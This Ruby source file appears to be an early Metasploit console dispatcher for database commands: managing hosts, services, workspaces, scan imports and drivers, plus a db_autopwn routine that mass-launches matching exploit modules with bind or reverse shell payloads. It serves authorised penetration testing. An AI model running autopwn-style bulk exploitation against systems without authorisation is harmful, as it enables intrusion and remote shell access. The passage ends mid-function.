
require 'rexml/document'
require 'rex/parser/nmap_xml'

module Msf
module Ui
module Console
module CommandDispatcher
class Db

		require 'tempfile'

		include Msf::Ui::Console::CommandDispatcher

		#
		# Constants
		#

		PWN_SHOW = 2**0
		PWN_XREF = 2**1
		PWN_PORT = 2**2
		PWN_EXPL = 2**3
		PWN_SING = 2**4
		PWN_SLNT = 2**5
		PWN_VERB = 2**6

		#
		# The dispatcher's name.
		#
		def name
			"Database Backend"
		end

		#
		# Returns the hash of commands supported by this dispatcher.
		#
		def commands
			base = {
				"db_driver"     => "Specify a database driver",
				"db_connect"    => "Connect to an existing database",
				"db_disconnect" => "Disconnect from the current database instance",
				"db_create"     => "Create a brand new database",
				"db_destroy"    => "Drop an existing database",
			}

			more = {
				"db_workspace"  => "Switch between database workspaces",
				"db_hosts"      => "List all hosts in the database",
				"db_services"   => "List all services in the database",
				"db_vulns"      => "List all vulnerabilities in the database",
				"db_notes"      => "List all notes in the database",
				"db_add_host"   => "Add one or more hosts to the database",
				"db_add_port"   => "Add a port to host",
				"db_add_note"   => "Add a note to host",
				"db_del_host"   => "Delete one or more hosts from the database",
				"db_del_port"   => "Delete one port from the database",
				"db_autopwn"    => "Automatically exploit everything",
				"db_import"     => "Import a scan result file (filetype will be auto-detected)",
				"db_import_amap_mlog"   => "Import a THC-Amap scan results file (-o -m)",
				"db_import_nessus_nbe"  => "Import a Nessus scan result file (NBE)",
				"db_import_nessus_xml"	=> "Import a Nessus scan result file (NESSUS)",
				"db_import_nmap_xml"    => "Import a Nmap scan results file (-oX)",
				"db_nmap"               => "Executes nmap and records the output automatically",
			}

			framework.db.active ? base.merge(more) : base
		end

		def cmd_db_workspace(*args)
			while (arg = args.shift)
				case arg
				when '-h','--help'
					print_line("Usage:")
					print_line("    db_workspace               List workspaces")
					print_line("    db_workspace [name]        Switch workspace")
					print_line("    db_workspace -a [name]     Add workspace")
					print_line("    db_workspace -d [name]     Delete workspace")
					print_line("    db_workspace -h            Show this help information")
					return
				when '-a','--add'
					adding = true
				when '-d','--del'
					deleting = true
				else
					name = arg
				end
			end

			if adding and name
				# Add workspace
				workspace = framework.db.add_workspace(name)
				print_status("Added workspace: #{workspace.name}")
				framework.db.workspace = workspace
			elsif deleting and name
				# Delete workspace
				workspace = framework.db.find_workspace(name)
				if workspace.nil?
					print_error("Workspace not found: #{name}")
				elsif workspace.default?
					workspace.destroy
					workspace = framework.db.add_workspace(name)
					print_status("Deleted and recreated the default workspace")
				else
					# switch to the default workspace if we're about to delete the current one
					framework.db.workspace = framework.db.default_workspace if framework.db.workspace.name == workspace.name
					# now destroy the named workspace
					workspace.destroy
					print_status("Deleted workspace: #{name}")
				end
			elsif name
				# Switch workspace
				workspace = framework.db.find_workspace(name)
				if workspace
					framework.db.workspace = workspace
					print_status("Workspace: #{workspace.name}")
				else
					print_error("Workspace not found: #{name}")
					return
				end
			else
				# List workspaces
				framework.db.workspaces.each do |s|
					pad = (s.name == framework.db.workspace.name) ? "* " : "  "
					print_line(pad + s.name)
				end
			end
		end

		def cmd_db_workspace_tabs(str, words)
			framework.db.workspaces.map { |s| s.name } if (words & ['-a','--add']).empty?
		end

 		def cmd_db_hosts(*args)
			onlyup = false
			host_search = nil
			col_search = nil
			default_columns = ::Msf::DBManager::Host.column_names.sort
			default_columns.delete_if {|v| (v[-2,2] == "id")}
			while (arg = args.shift)
				case arg
				when '-c'
					list = args.shift
					if(!list)
						print_error("Invalid column list")
						return
					end
					col_search = list.strip().split(",")
					col_search.each { |c|
						if not default_columns.include? c
							print_error("Invalid column list. Possible values are (#{default_columns.join("|")})")
							return
						end
					}
				when '-u','--up'
					onlyup = true
				when '-a'
					hostlist = args.shift
					if (!hostlist)
						print_error("Invalid host list")
						return
					end
					host_search = hostlist.strip().split(",")
				when '-h','--help'
					print_line "Usage: db_hosts [-h|--help] [-u|--up] [-a <addr1,addr2>] [-c <column1,column2>]"
					print_line
					print_line "  -a <addr1,addr2>  Search for a list of addresses"
					print_line "  -c <col1,col2>    Only show the given columns"
					print_line "  -h,--help         Show this help information"
					print_line "  -u,--up           Only show hosts which are up"
					print_line
					print_line "Available columns: #{default_columns.join(", ")}"
					print_line
					return
				end
			end

			col_names = default_columns
			if col_search
				col_names.delete_if {|v| not col_search.include?(v)}
			end
			tbl = Rex::Ui::Text::Table.new({
					'Header'  => "Hosts",
					'Columns' => col_names + ["Svcs", "Vulns", "Workspace"],
				})
			framework.db.hosts(framework.db.workspace, onlyup, host_search).each do |host|
				columns = col_names.map { |n| host.attributes[n] || "" }
				columns += [host.services.length, host.vulns.length, host.workspace.name]
				tbl << columns
			end
			print_line
			print_line tbl.to_s
 		end

		def cmd_db_services(*args)
			onlyup = false
			host_search = nil
			port_search = nil
			proto_search = nil
			name_search = nil
			col_search = nil
			default_columns = ::Msf::DBManager::Service.column_names.sort
			default_columns.delete_if {|v| (v[-2,2] == "id")}
			while (arg = args.shift)
				case arg
				when '-u','--up'
					onlyup = true
				when '-c'
					list = args.shift
					if(!list)
						print_error("Invalid column list")
						return
					end
					col_search = list.strip().split(",")
					col_search.each { |c|
						if not default_columns.include? c
							print_error("Invalid column list. Possible values are (#{default_columns.join("|")})")
							return
						end
					}
				when '-a'
					addrlist = args.shift
					if (!addrlist)
						print_error("Invalid address list")
						return
					end
					addrs = addrlist.strip().split(",")
				when '-p'
					portlist = args.shift
					if (!portlist)
						print_error("Invalid port list")
						return
					end
					ports = portlist.strip().split(",")
				when '-r'
					proto = args.shift
					if (!proto)
						print_status("Invalid protocol")
						return
					end
					proto = proto.strip
				when '-n'
					namelist = args.shift
					if (!namelist)
						print_error("Invalid name list")
						return
					end
					names = namelist.strip().split(",")

				when '-h','--help'
					print_line
					print_line "Usage: db_services [-h|--help] [-u|--up] [-a <addr1,addr2>] [-r <proto>] [-p <port1,port2>] [-n <name1,name2>]"
					print_line
					print_line "  -a <addr1,addr2>  Search for a list of addresses"
					print_line "  -c <col1,col2>    Only show the given columns"
					print_line "  -h,--help         Show this help information"
					print_line "  -n <name1,name2>  Search for a list of service names"
					print_line "  -p <port1,port2>  Search for a list of ports"
					print_line "  -r <protocol>     Only show [tcp|udp] services"
					print_line "  -u,--up           Only show services which are up"
					print_line
					print_line "Available columns: #{default_columns.join(", ")}"
					print_line
					return
				end
			end

			col_names = default_columns
			if col_search
				col_names.delete_if {|v| not col_search.include?(v)}
			end
			tbl = Rex::Ui::Text::Table.new({
					'Header'  => "Services",
					'Columns' => col_names + ["Host", "Workspace"],
				})
			framework.db.services(framework.db.workspace, onlyup, proto, addrs, ports, names).each do |service|
				columns = col_names.map { |n| service.attributes[n] || "" }
				host = service.host
				columns += [host.address, host.workspace.name]
				tbl << columns
			end
			print_line
			print_line tbl.to_s
		end


		def cmd_db_vulns(*args)
			framework.db.each_vuln(framework.db.workspace) do |vuln|
				reflist = vuln.refs.map { |r| r.name }
				if(vuln.service)
					print_status("Time: #{vuln.created} Vuln: host=#{vuln.host.address} port=#{vuln.service.port} proto=#{vuln.service.proto} name=#{vuln.name} refs=#{reflist.join(',')}")
				else
					print_status("Time: #{vuln.created} Vuln: host=#{vuln.host.address} name=#{vuln.name} refs=#{reflist.join(',')}")
				end
			end
		end

 		def cmd_db_notes(*args)
			hosts = nil
			types = nil
			while (arg = args.shift)
				case arg
				when '-a'
					hostlist = args.shift
					if(!hostlist)
						print_status("Invalid host list")
						return
					end
					hosts = hostlist.strip().split(",")
				when '-t'
					typelist = args.shift
					if(!typelist)
						print_status("Invalid host list")
						return
					end
					types = typelist.strip().split(",")
				when '-h','--help'
					print_status("Usage: db_notes [-h|--help] [-a <addr1,addr2>] [-t <type1,type2>]")
					print_line("  -a <addr1,addr2>  Search for a list of addresses")
					print_line("  -t <type1,type2>  Search for a list of types")
					print_line("  -h,--help         Show this help information")
					return
				end

			end
 			framework.db.each_note(framework.db.workspace) do |note|
				next if(hosts and (note.host == nil or hosts.index(note.host.address) == nil))
				next if(types and types.index(note.ntype) == nil)
				if (note.host and note.service)
					print_status("Time: #{note.created} Note: host=#{note.host.address} service=#{note.service.name} type=#{note.ntype} data=#{note.data.inspect}")
				elsif (note.host)
					print_status("Time: #{note.created} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data.inspect}")
				elsif (note.service)
					print_status("Time: #{note.created} Note: service=#{note.service.name} type=#{note.ntype} data=#{note.data.inspect}")
				else
					print_status("Time: #{note.created} Note: type=#{note.ntype} data=#{note.data.inspect}")
				end
 			end
 		end

		def cmd_db_add_host(*args)
			print_status("Adding #{args.length} hosts...")
			args.each do |address|
				host = framework.db.find_or_create_host(:host => address)
				print_status("Time: #{host.created} Host: host=#{host.address}")
			end
		end

		def cmd_db_add_port(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_add_port <host> <port> [proto] [name]")
				return
			end

			host = framework.db.find_or_create_host(:host => args[0])
			return if not host
			info = {
				:host => host,
				:port => args[1].to_i
			}
			info[:proto] = args[2].downcase if args[2]
			info[:name]  = args[3].downcase if args[3]

			service = framework.db.find_or_create_service(info)
			return if not service

			print_status("Time: #{service.created} Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state}")
		end

		def cmd_db_del_port(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_del_port [host] [port] [proto]")
				return
			end

			if framework.db.del_service(framework.db.workspace, args[0], args[2].downcase, args[1].to_i)
				print_status("Service: host=#{args[0]} port=#{args[1].to_i} proto=#{args[2].downcase} deleted")
			end
		end

		def cmd_db_add_note(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_add_note [host] [type] [note]")
				return
			end

			naddr = args.shift
			ntype = args.shift
			ndata = args.join(" ")

			host = framework.db.find_or_create_host(:host => naddr)
			return if not host

			note = framework.db.find_or_create_note(:host => host, :type => ntype, :data => ndata)
			return if not note

			print_status("Time: #{note.created} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data}")
		end


		def cmd_db_del_host(*args)
			args.each do |address|
				if framework.db.del_host(framework.db.workspace, address)
					print_status("Host #{address} deleted")
				end
			end
		end

		#
		# A shotgun approach to network-wide exploitation
		#
		def cmd_db_autopwn(*args)

			stamp = Time.now.to_f
			vcnt  = 0
			rcnt  = 0
			mode  = 0
			code  = :bind
			mjob  = 5
			regx  = nil
			minrank = nil

			port_inc = []
			port_exc = []

			targ_inc = []
			targ_exc = []

			args.push("-h") if args.length == 0

			while (arg = args.shift)
				case arg
				when '-t'
					mode |= PWN_SHOW
				when '-x'
					mode |= PWN_XREF
				when '-p'
					mode |= PWN_PORT
				when '-e'
					mode |= PWN_EXPL
				when '-s'
					mode |= PWN_SING
				when '-q'
					mode |= PWN_SLNT
				when '-v'
					mode |= PWN_VERB
				when '-j'
					mjob = args.shift.to_i
				when '-r'
					code = :conn
				when '-b'
					code = :bind
				when '-I'
					targ_inc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
				when '-X'
					targ_exc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
				when '-PI'
					port_inc = Rex::Socket.portspec_crack(args.shift)
				when '-PX'
					port_exc = Rex::Socket.portspec_crack(args.shift)
				when '-m'
					regx = args.shift
				when '-R'
					minrank = args.shift
				when '-h','--help'
					print_status("Usage: db_autopwn [options]")
					print_line("\t-h          Display this help text")
					print_line("\t-t          Show all matching exploit modules")
					print_line("\t-x          Select modules based on vulnerability references")
					print_line("\t-p          Select modules based on open ports")
					print_line("\t-e          Launch exploits against all matched targets")
#					print_line("\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)")
					print_line("\t-r          Use a reverse connect shell")
					print_line("\t-b          Use a bind shell on a random port (default)")
					print_line("\t-q          Disable exploit module output")
					print_line("\t-R  [rank]  Only run modules with a minimal rank")
					print_line("\t-I  [range] Only exploit hosts inside this range")
					print_line("\t-X  [range] Always exclude hosts inside this range")
					print_line("\t-PI [range] Only exploit hosts with these ports open")
					print_line("\t-PX [range] Always exclude hosts with these ports open")
					print_line("\t-m  [regex] Only run modules whose name matches the regex")
					print_line("")
					return
				end
			end

			minrank = minrank || framework.datastore['MinimumRank'] || 'manual'
			if ! RankingName.values.include?(minrank)
				print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
				wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
				return
			else
				minrank = RankingName.invert[minrank]
			end

			# Default to quiet mode
			if (mode & PWN_VERB == 0)
				mode |= PWN_SLNT
			end

			matches    = {}
			refmatches = {}

			# Pre-allocate a list of references and ports for all exploits
			mrefs  = {}
			mports = {}
			mservs = {}

			[ [framework.exploits, 'exploit' ], [ framework.auxiliary, 'auxiliary' ] ].each do |mtype|
				mtype[0].each_module do |modname, mod|
					o = mod.new

					if(mode & PWN_XREF != 0)
						o.references.each do |r|
							next if r.ctx_id == 'URL'
							ref = r.ctx_id + "-" + r.ctx_val
							ref.upcase!

							mrefs[ref] ||= {}
							mrefs[ref][o.fullname] = o
						end
					end

					if(mode & PWN_PORT != 0)
						if(o.datastore['RPORT'])
							rport = o.datastore['RPORT']
							mports[rport.to_i] ||= {}
							mports[rport.to_i][o.fullname] = o
						end

						if(o.respond_to?('autofilter_ports'))
							o.autofilter_ports.each do |rport|
								mports[rport.to_i] ||= {}
								mports[rport.to_i][o.fullname] = o
							end
						end

						if(o.respond_to?('autofilter_services'))
							o.autofilter_services.each do |serv|
								mservs[serv] ||= {}
								mservs[serv][o.fullname] = o
							end
						end
					end
				end
			end


			begin

			framework.db.hosts.each do |host|
				xhost = host.address
				next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
				next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))

				if(mode & PWN_VERB != 0)
					print_status("Scanning #{xhost} for matching exploit modules...")
				end

				#
				# Match based on vulnerability references
				#
				if (mode & PWN_XREF != 0)

					host.vulns.each do |vuln|

						# Faster to handle these here
						serv = vuln.service
						xport = xprot = nil

						if(serv)
							xport = serv.port
							xprot = serv.proto
						end

						vuln.refs.each do |ref|
							mods = mrefs[ref.name.upcase] || {}
							mods.each_key do |modname|
								mod = mods[modname]
								next if minrank and minrank > mod.rank
								next if (regx and mod.fullname !~ /#{regx}/)

								if(xport)
									next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
									next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
								else
									if(mod.datastore['RPORT'])
										next if (port_inc.length > 0 and not port_inc.include?(mod.datastore['RPORT'].to_i))
										next if (port_exc.length > 0 and port_exc.include?(mod.datastore['RPORT'].to_i))
									end
								end

								next if (regx and e.fullname !~ /#{regx}/)

								mod.datastore['RPORT'] = xport if xport
								mod.datastore['RHOST'] = xhost

								filtered = false
								begin
									::Timeout.timeout(2, ::RuntimeError) do
										filtered = true if not mod.autofilter()
									end
								rescue ::Interrupt
									raise $!
								rescue ::Timeout::Error
									filtered = true
								rescue ::Exception
									filtered = true
								end
								next if filtered

								matches[[xport,xprot,xhost,mod.fullname]]=true
								refmatches[[xport,xprot,xhost,mod.fullname]] ||= []
								refmatches[[xport,xprot,xhost,mod.fullname]] << ref.name
							end
						end
					end
				end

				#
				# Match based on open ports
				#
				if (mode & PWN_PORT != 0)
					host.services.each do |serv|
						next if not serv.host
						next if (serv.state != ServiceState::Open)

						xport = serv.port.to_i
						xprot = serv.proto
						xname = serv.name

						next if xport == 0

						next if (port_inc.length > 0 and not port_inc.include?(xport))
						next if (port_exc.length > 0 and port_exc.include?(xport))

						mods = mports[xport.to_i] || {}

						mods.each_key do |modname|
							mod = mods[modname]
							next if minrank and minrank > mod.rank
							next if (regx and mod.fullname !~ /#{regx}/)
							mod.datastore['RPORT'] = xport
							mod.datastore['RHOST'] = xhost

							filtered = false
							begin
								::Timeout.timeout(2, ::RuntimeError) do
									filtered = true if not mod.autofilter()
								end
							rescue ::Interrupt
								raise $!
							rescue ::Exception
								filtered = true
							end

							next if filtered
							matches[[xport,xprot,xhost,mod.fullname]]=true
						end

						mods = mservs[xname] || {}
						mods.each_key do |modname|
							mod = mods[modname]
							next if minrank and minrank > mod.rank
							next if (regx and mod.fullname !~ /#{regx}/)
							mod.datastore['RPORT'] = xport
							mod.datastore['RHOST'] = xhost

							filtered = false
							begin
								::Timeout.timeout(2, ::RuntimeError) do
									filtered = true if not mod.autofilter()
								end
							rescue ::Interrupt
								raise $!
							rescue ::Exception
								filtered = true
							end

							next if filtered
							matches[[xport,xprot,xhost,mod.fullname]]=true
						end
					end
				end
			end

			rescue ::Exception => e
				print_status("ERROR: #{e.class} #{e} #{e.backtrace}")
				return
			end

			if (mode & PWN_SHOW != 0)
				print_status("Analysis completed in #{(Time.now.to_f - stamp).to_i} seconds (#{vcnt} vulns / #{rcnt} refs)")
				print_status("")
				print_status("=" * 80)
				print_status(" " * 28 + "Matching Exploit Modules")
				print_status("=" * 80)

				matches.each_key do |xref|
					mod = nil
					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					if (mode & PWN_SHOW != 0)
						tport = xref[0] || mod.datastore['RPORT']
						if(refmatches[xref])
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (#{refmatches[xref].join(", ")})")
						else
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (port match)")
						end
					end

				end
				print_status("=" * 80)
				print_status("")
				print_status("")
			end


			idx = 0
			matches.each_key do |xref|

				idx += 1

				begin
					mod = nil

					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					#
					# The code is just a proof-of-concept and will be expanded in the future
					#
					if (mode & PWN_EXPL != 0)

						mod.datastore['RHOST'] = xref[2]

						if(xref[0])
							mod.datastore['RPORT'] = xref[0].to_s
						end

						if (code == :bind)
							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/bind_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
							end
						end

						if (code == :conn)
							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s

							if (mod.datastore['LHOST'] == '127.0.0.1')
								print_status("Failed to determine listener address for target #{xref[2]}...")
								next
							end

							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
							end
						end


						if(framework.jobs.keys.length >= mjob)
							print_status("Job limit reached, waiting on modules to finish...")
							while(framework.jobs.keys.length >= mjob)
								select(nil, nil, nil, 0.25)
							end
						end

						print_status("(#{idx}/#{matches.length} [#{framework.sessions.length} sessions]): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore['RPORT']}...")

						begin
							inp = (mode & PWN_SLNT != 0) ? nil : driver.input
							out = (mode & PWN_SLNT != 0) ? nil : driver.output

							case mod.type
							when MODULE_EXPLOIT
								session = mod.exploit_simple(
									'Payload'        => mod.datastore['PAYLOAD'],
									'LocalInput'     => inp,
									'LocalOutput'    => out,
									'RunAsJob'       => true)
							when MODULE_AUX
								session = mod.run_simple(
									'LocalInput'     => inp,
									'LocalOutput'    => out,
									'RunAsJob'       => true)
							end
						rescue ::Interrupt
							raise $!
						rescue ::Exception
							print_status(" >> autopwn exception during launch from #{xref[3]}: #{$!} ")
						end
					end

				rescue ::Interrupt
					raise $!
				rescue ::Exception
					print_status(" >> autopwn exception from #{xref[3]}: #{$!} #{$!.backtrace}")
				end
			end


			while(framework.jobs.keys.length > 0)
				print_status("(#{matches.length}/#{matches.length} [#{framework.sessions.length} sessions]): Waiting on #{framework.jobs.length} launched modules to finish execution...")
				select(nil, nil, nil, 5.0)
			end

			if (mode & PWN_SHOW != 0 and mode & PWN_EXPL != 0)
				print_status("The autopwn command has completed with #{framework.sessions.length} sessions")
				if(framework.sessions.length > 0)
					print_status("Enter sessions -i [ID] to interact with a given session ID")
					print_status("")
					print_status("=" * 80)
					driver.run_single("sessions -l -v")
					print_status("=" * 80)
				end
			end
			print_line("")
		# EOM
		end

		#
		# Generic import that automatically detects the file type
		#
		def cmd_db_import(*args)
			if (args.include?("-h") or not (args and args.length > 0))
				print_error("Usage: db_import <filename> [file2...]")
				print_line
				print_line("filenames can be globs like *.xml, or **/*.xml which will search recursively")
				return
			end
			args.each { |glob|
				files = Dir.glob(File.expand_path(glob))
				if files.empty?
					print_error("No such file #{glob}")
					next
				end
				files.each { |filename|
					if (not File.readable?(filename))
						print_error("Could not read file #{filename}")
						next
					end
					begin
						framework.db.import_file(filename)
						print_status("Successfully imported #{filename}")
					rescue DBImportError
						print_error("Failed to import #{filename}: #{$!}")
						elog("Failed to import #{filename}: #{$!.class}: #{$!}")
						dlog("Call stack: #{$@.join("\n")}", LEV_3)
						next
					end
				}
			}
		end

		#
		# Import Nessus NBE files
		#
		def cmd_db_import_nessus_nbe(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nessus_xml <nessus.nbe>")
				return
			end

			if (not File.readable?(args[0]))
				print_status("Could not read the NBE file")
				return
			end
			framework.db.import_nessus_nbe_file(args[0])
		end

		#
		# Import Nessus NESSUS files
		#
		def cmd_db_import_nessus_xml(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nessus_xml <nessus.nessus>")
				return
			end

			if (not File.readable?(args[0]))
				print_status("Could not read the NESSUS file")
				return
			end
			framework.db.import_nessus_xml_file(args[0])
		end

		#
		# Import Nmap data from a file
		#
		def cmd_db_import_nmap_xml(*args)
			if (not (args and args.length == 1))
				print_error("Usage: db_import_nmap_xml <nmap.xml>")
				return
			end

			if (not File.readable?(args[0]))
				print_status("Could not read the NMAP file")
				return
			end
			framework.db.import_nmap_xml_file(args[0])
		end

		#
		# Import Nmap data from a file
		#
		def cmd_db_nmap(*args)
			if (args.length == 0)
				print_status("Usage: db_nmap [nmap options]")
				return
			end

			nmap =
				Rex::FileUtils.find_full_path("nmap") ||
				Rex::FileUtils.find_full_path("nmap.exe")

			if (not nmap)
				print_error("The nmap executable could not be found")
				return
			end

			fd = Tempfile.new('dbnmap')
			fo = Tempfile.new('dbnmap')

			# When executing native Nmap in Cygwin, expand the Cygwin path to a Win32 path
			if(Rex::Compat.is_cygwin and nmap =~ /cygdrive/)
				# Custom function needed because cygpath breaks on 8.3 dirs
				tout = Rex::Compat.cygwin_to_win32(fd.path)
				fout = Rex::Compat.cygwin_to_win32(fo.path)
				args.push('-oX', tout)
				args.push('-oN', fout)
			else
				args.push('-oX', fd.path)
				args.push('-oN', fo.path)
			end
			system([nmap, "nmap"], *args)

			# Until we hide stdout above, this is pointless
			# fo.each_line do |line|
			#	print_status("NMAP: #{line.strip}")
			# end

			::File.unlink(fo.path)
			framework.db.import_nmap_xml_file(fd.path)
		end

		#
		# Import from a THC-Amap machine-readable log file
		#
		def cmd_db_import_amap_mlog(*args)
			if args.length == 0
				print_status("Usage: db_import_amap_mlog [logfile]")
				return
			end

			if not File.readable?(args[0])
				print_error("Could not read the log file")
				return
			end

			framework.db.import_amap_mlog_file(args[0])
		end

		#
		# Determine if an IP address is inside a given range
		#
		def range_include?(ranges, addr)

			ranges.each do |sets|
				sets.split(',').each do |set|
					rng = set.split('-').map{ |c| Rex::Socket::addr_atoi(c) }
					tst = Rex::Socket::addr_atoi(addr)
					if (not rng[1])
						return tst == rng[0]
					elsif (tst >= rng[0] and tst <= rng[1])
						return true
					end
				end
			end

			false
		end


		#
		# Database management
		#

		def db_check_driver
			if(not framework.db.driver)
				print_error("No database driver has been specified")
				return false
			end
			true
		end

		def cmd_db_driver(*args)

			if(args[0])
				if(args[0] == "-h" || args[0] == "--help")
					print_status("Usage: db_driver [driver-name]")
					return
				end

				if(framework.db.drivers.include?(args[0]))
					framework.db.driver = args[0]
					print_status("Using database driver #{args[0]}")
				else
					print_error("Invalid driver specified")
				end
				return
			end

			if(framework.db.driver)
				print_status("   Active Driver: #{framework.db.driver}")
			else
				print_status("No Active Driver")
			end
			print_status("       Available: #{framework.db.drivers.join(", ")}")
			print_line("")

			if ! framework.db.drivers.include?('sqlite3')
				print_status("    DB Support: Enable the sqlite3 driver with the following command:")
				print_status("                $ gem install sqlite3-ruby")
				print_line("")
			end

			if ! framework.db.drivers.include?('mysql')
				print_status("    DB Support: Enable the mysql driver with the following command:")
				print_status("                $ gem install mysql")
				print_status("    This gem requires mysqlclient headers, which can be installed on Ubuntu with:")
				print_status("                $ sudo apt-get install libmysqlclient-dev")
				print_line("")
			end

			if ! framework.db.drivers.include?('postgresql')
				print_status("    DB Support: Enable the postgresql driver with the following command:")
				print_status("                $ gem install postgres-pr")
				print_line("")
			end
		end

		def cmd_db_driver_tabs(str, words)
			return framework.db.drivers
		end

		def cmd_db_create(*args)
			return if not db_check_driver
			meth = "db_create_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_destroy(*args)
			return if not db_check_driver

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_destroy")
				return
			end

			meth = "db_destroy_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_connect(*args)
			return if not db_check_driver
			meth = "db_connect_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_disconnect(*args)
			return if not db_check_driver

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_disconnect")
				return
			end

			meth = "db_disconnect_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end


		def db_find_tools(tools)
			found   = true
			missed  = []
			tools.each do |name|
				if(! Rex::FileUtils.find_full_path(name))
					missed << name
				end
			end
			if(not missed.empty?)
				print_error("This database command requires the following tools to be installed: #{missed.join(", ")}")
				return
			end
			true
		end

		#
		# Database management: SQLite3
		#

		#
		# Disconnect from the current SQLite3 instance
		#
		def db_disconnect_sqlite3(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing SQLite database
		#
		def db_connect_sqlite3(*args)

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_connect [database-file-path]")
				return
			end

			info = db_parse_db_uri_sqlite3(args[0])
			dbfile = info[:path]
			opts = { 'adapter' => 'sqlite3', 'database' => dbfile }

			if (not ::File.exists?(dbfile))
				print_error("The specified database does not exist")
				return
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			print_status("Successfully connected to the database")
			print_status("File: #{dbfile}")
		end

		#
		# Create a new SQLite database instance
		#
		def db_create_sqlite3(*args)
			cmd_db_disconnect()

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				print_status("Usage: db_create [database-file-path]")
				return
			end

			info = db_parse_db_uri_sqlite3(args[0])
			dbfile = info[:path]
			opts = { 'adapter' => 'sqlite3', 'database' => dbfile }

			if (::File.exists?(dbfile))
				print_status("The specified database already exists, connecting")
			else
				print_status("Creating a new database instance...")
				require_library_or_gem('sqlite3')
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			print_status("Successfully connected to the database")

			print_status("File: #{dbfile}")
		end

		#
		# Drop an existing database
		#
		def db_destroy_sqlite3(*args)
			cmd_db_disconnect()
			info = db_parse_db_uri_sqlite3(args[0])
			begin
				print_status("Deleting #{info[:path]}...")
				File.unlink(info[:path])
			rescue Errno::ENOENT
				print_error("The specified database does not exist")
			end
		end

		def db_parse_db_uri_sqlite3(path)
			res = {}
			res[:path] = path || ::File.join(Msf::Config.config_directory, 'sqlite3.db')
			res
		end

		#
		# Database management: MySQL
		#

		#
		# Disconnect from the current MySQL instance
		#
		def db_disconnect_mysql(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing MySQL database
		#
		def db_connect_mysql(*args)
			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_connect <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_connect user@metasploit3")
				print_status("       db_connect user:pass@192.168.0.2/metasploit3")
				print_status("       db_connect user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			opts['host'] ||= 'localhost'

			# This is an ugly hack for a broken MySQL adapter:
			# 	http://dev.rubyonrails.org/ticket/3338
			if (opts['host'].strip.downcase == 'localhost')
				opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		#
		# Create a new MySQL database instance
		#
		def db_create_mysql(*args)
			cmd_db_disconnect()

			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_create <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_create user@metasploit3")
				print_status("       db_create user:pass@192.168.0.2/metasploit3")
				print_status("       db_create user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			return if ! db_find_tools(%W{mysqladmin mysql})

			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }

			argv = []

